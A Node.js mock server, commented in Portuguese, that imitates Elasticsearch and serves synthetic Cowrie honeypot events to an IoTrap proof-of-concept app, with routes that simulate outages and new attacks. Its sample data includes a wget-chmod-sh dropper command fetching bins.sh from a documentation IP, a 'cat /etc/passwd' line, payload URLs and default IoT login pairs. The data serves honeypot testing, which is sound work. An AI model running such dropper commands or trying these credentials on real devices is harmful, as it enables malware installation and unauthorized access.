#!/usr/bin/env node
/**
 * Servidor que imita o Elasticsearch do IoTrap para a prova de conceito.
 * Sem dependências: só Node 18+.
 *
 *   npm run mock                      # porta 9200, sem chave
 *   MOCK_API_KEY=segredo npm run mock # exige "Authorization: ApiKey segredo"
 *
 * Rotas que imitam o Elasticsearch:
 *   GET  /                      informações do "cluster"
 *   POST /<índice>/_search      eventos do Cowrie (aceita size e o filtro terms de eventid)
 *
 * Rotas de controle, para provocar os critérios (abra no navegador):
 *   /__mock/down     passa a responder 503 (C3)
 *   /__mock/slow     passa a demorar 12 s para responder (estoura o tempo limite)
 *   /__mock/up       volta ao normal
 *   /__mock/attack   registra um ataque agora (C2)
 *   /__mock/status   mostra o modo atual
 *
 * Os IPs de origem são dos blocos reservados para documentação (RFC 5737),
 * não de pessoas reais.
 */
import { randomBytes } from 'node:crypto';
import { createServer } from 'node:http';
import { networkInterfaces } from 'node:os';

const PORT = Number(process.env.PORT ?? 9200);
const API_KEY = process.env.MOCK_API_KEY ?? '';
const NEW_ATTACK_EVERY_MS = Number(process.env.MOCK_ATTACK_EVERY_MS ?? 12_000);
const INDEX_PREFIX = 'cowrie';

const ATTACKERS = [
  { ip: '203.0.113.45', country: 'China', city: 'Shenzhen' },
  { ip: '203.0.113.201', country: 'Rússia', city: 'Moscou' },
  { ip: '198.51.100.23', country: 'Estados Unidos', city: 'Ashburn' },
  { ip: '198.51.100.77', country: 'Brasil', city: 'São Paulo' },
  { ip: '192.0.2.14', country: 'Vietnã', city: 'Hanói' },
  { ip: '192.0.2.150', country: 'Índia', city: 'Mumbai' },
  { ip: '203.0.113.9', country: 'Países Baixos', city: 'Amsterdã' },
];
const CREDENTIALS = [
  ['root', 'root'],
  ['admin', 'admin'],
  ['pi', 'raspberry'],
  ['ubnt', 'ubnt'],
  ['root', '123456'],
  ['support', 'support'],
  ['user', 'user'],
  ['root', 'xc3511'],
];
const COMMANDS = [
  'uname -a',
  'cat /proc/cpuinfo | grep name | wc -l',
  'enable; system; shell; sh',
  'cat /etc/passwd',
  'cd /tmp || cd /var/run; wget http://198.51.100.23/bins.sh; chmod 777 bins.sh; sh bins.sh',
  '/bin/busybox IOTRAP',
  'echo -e "\\x6F\\x6B"',
];
const DOWNLOADS = ['http://198.51.100.23/bins.sh', 'http://192.0.2.77/mips', 'http://203.0.113.45/x86_64'];
const EVENT_WEIGHTS = [
  ['cowrie.login.failed', 6],
  ['cowrie.login.success', 1],
  ['cowrie.command.input', 3],
  ['cowrie.session.file_download', 1],
];

const pickOne = (list) => list[Math.floor(Math.random() * list.length)];

function pickEventId() {
  const total = EVENT_WEIGHTS.reduce((sum, [, w]) => sum + w, 0);
  let roll = Math.random() * total;
  for (const [id, weight] of EVENT_WEIGHTS) {
    roll -= weight;
    if (roll <= 0) return id;
  }
  return EVENT_WEIGHTS[0][0];
}

let sequence = 0;

function makeEvent(timeMs = Date.now(), eventid = pickEventId()) {
  const attacker = pickOne(ATTACKERS);
  const protocol = Math.random() < 0.6 ? 'telnet' : 'ssh';
  const iso = new Date(timeMs).toISOString();
  const source = {
    '@timestamp': iso,
    timestamp: iso,
    eventid,
    src_ip: attacker.ip,
    src_port: 30000 + Math.floor(Math.random() * 30000),
    dst_port: protocol === 'ssh' ? 22 : 23,
    protocol,
    session: randomBytes(6).toString('hex'),
    sensor: 'iotrap-rpi',
    geoip: { country_name: attacker.country, city_name: attacker.city },
  };
  if (eventid.startsWith('cowrie.login')) {
    const [username, password] = pickOne(CREDENTIALS);
    Object.assign(source, { username, password });
  } else if (eventid.startsWith('cowrie.command')) {
    source.input = pickOne(COMMANDS);
  } else if (eventid === 'cowrie.session.file_download') {
    source.url = pickOne(DOWNLOADS);
    source.shasum = randomBytes(32).toString('hex');
  }
  sequence += 1;
  return { _index: `${INDEX_PREFIX}-${iso.slice(0, 10).replaceAll('-', '.')}`, _id: `evt-${sequence}`, _source: source };
}

// Histórico inicial: 40 eventos espalhados nas últimas 6 horas.
const events = [];
for (let i = 0; i < 40; i += 1) {
  events.push(makeEvent(Date.now() - Math.floor(Math.random() * 6 * 3600 * 1000)));
}

function addAttack() {
  const event = makeEvent();
  events.push(event);
  log(`novo ataque: ${event._source.eventid} de ${event._source.src_ip}`);
  return event;
}

let mode = 'up'; // 'up' | 'down' | 'slow'

function log(message) {
  console.log(`[${new Date().toLocaleTimeString('pt-BR')}] ${message}`);
}

function send(res, status, body) {
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Authorization, Content-Type',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  });
  res.end(JSON.stringify(body, null, 2));
}

function esError(status, type, reason) {
  return { error: { root_cause: [{ type, reason }], type, reason }, status };
}

function readBody(req) {
  return new Promise((resolve) => {
    let raw = '';
    req.on('data', (chunk) => {
      raw += chunk;
    });
    req.on('end', () => {
      if (!raw) return resolve({});
      try {
        resolve(JSON.parse(raw));
      } catch {
        resolve(null);
      }
    });
  });
}

function wantedEventIds(body) {
  const filters = body?.query?.bool?.filter;
  if (!Array.isArray(filters)) return null;
  for (const filter of filters) {
    const ids = filter?.terms?.eventid;
    if (Array.isArray(ids)) return new Set(ids);
  }
  return null;
}

async function handleSearch(req, res, index) {
  if (API_KEY && req.headers.authorization !== `ApiKey ${API_KEY}`) {
    log(`401 chave inválida (${req.headers.authorization ?? 'sem cabeçalho'})`);
    return send(res, 401, esError(401, 'security_exception', 'unable to authenticate with provided credentials'));
  }
  if (!index.startsWith(INDEX_PREFIX)) {
    log(`404 índice ${index}`);
    return send(res, 404, esError(404, 'index_not_found_exception', `no such index [${index}]`));
  }
  if (mode === 'down') {
    log('503 (modo down)');
    return send(res, 503, esError(503, 'cluster_block_exception', 'IoTrap mock em modo down'));
  }
  if (mode === 'slow') {
    log('modo slow: segurando a resposta por 12 s');
    await new Promise((resolve) => setTimeout(resolve, 12_000));
  }

  const body = req.method === 'POST' ? await readBody(req) : {};
  if (body === null) {
    return send(res, 400, esError(400, 'parsing_exception', 'corpo não é JSON'));
  }
  const size = Number.isInteger(body.size) ? Math.min(Math.max(body.size, 0), 500) : 10;
  const ids = wantedEventIds(body);
  const since = Date.now() - 24 * 3600 * 1000;
  const matches = events
    .filter((e) => Date.parse(e._source['@timestamp']) >= since)
    .filter((e) => !ids || ids.has(e._source.eventid))
    .sort((a, b) => Date.parse(b._source['@timestamp']) - Date.parse(a._source['@timestamp']));

  log(`200 _search ${index}: ${Math.min(size, matches.length)} de ${matches.length}`);
  return send(res, 200, {
    took: 3,
    timed_out: false,
    _shards: { total: 1, successful: 1, skipped: 0, failed: 0 },
    hits: {
      total: { value: matches.length, relation: 'eq' },
      max_score: null,
      hits: matches.slice(0, size).map((e) => ({ ...e, _score: null })),
    },
  });
}

const server = createServer(async (req, res) => {
  const url = new URL(req.url ?? '/', `http://${req.headers.host ?? 'localhost'}`);
  const path = decodeURIComponent(url.pathname);

  if (req.method === 'OPTIONS') return send(res, 204, {});

  if (path === '/') {
    return send(res, 200, {
      name: 'iotrap-mock',
      cluster_name: 'iotrap',
      version: { number: '8.15.0-mock' },
      tagline: 'You Know, for Search',
    });
  }

  if (path.startsWith('/__mock/')) {
    const action = path.slice('/__mock/'.length);
    if (action === 'down' || action === 'up' || action === 'slow') {
      mode = action;
      log(`modo -> ${mode}`);
    } else if (action === 'attack') {
      const event = addAttack();
      return send(res, 200, { ok: true, mode, event });
    } else if (action !== 'status') {
      return send(res, 404, { ok: false, error: 'use down, up, slow, attack ou status' });
    }
    return send(res, 200, { ok: true, mode, events: events.length, requiresApiKey: Boolean(API_KEY) });
  }

  const match = path.match(/^\/([^/]+)\/_search$/);
  if (match && (req.method === 'POST' || req.method === 'GET')) {
    return handleSearch(req, res, match[1]);
  }

  return send(res, 404, esError(404, 'resource_not_found', `rota ${req.method} ${path} não existe no mock`));
});

const timer = setInterval(addAttack, NEW_ATTACK_EVERY_MS);
timer.unref();

server.listen(PORT, '0.0.0.0', () => {
  const lanIps = Object.values(networkInterfaces())
    .flat()
    .filter((i) => i && i.family === 'IPv4' && !i.internal)
    .map((i) => i.address);
  log(`IoTrap mock ouvindo na porta ${PORT}${API_KEY ? ' (exige ApiKey)' : ''}`);
  for (const ip of lanIps) {
    console.log(`  no .env.local: EXPO_PUBLIC_IOTRAP_ES_URL=http://${ip}:${PORT}`);
  }
  console.log(`  controle: http://${lanIps[0] ?? 'localhost'}:${PORT}/__mock/status`);
});

export { server };
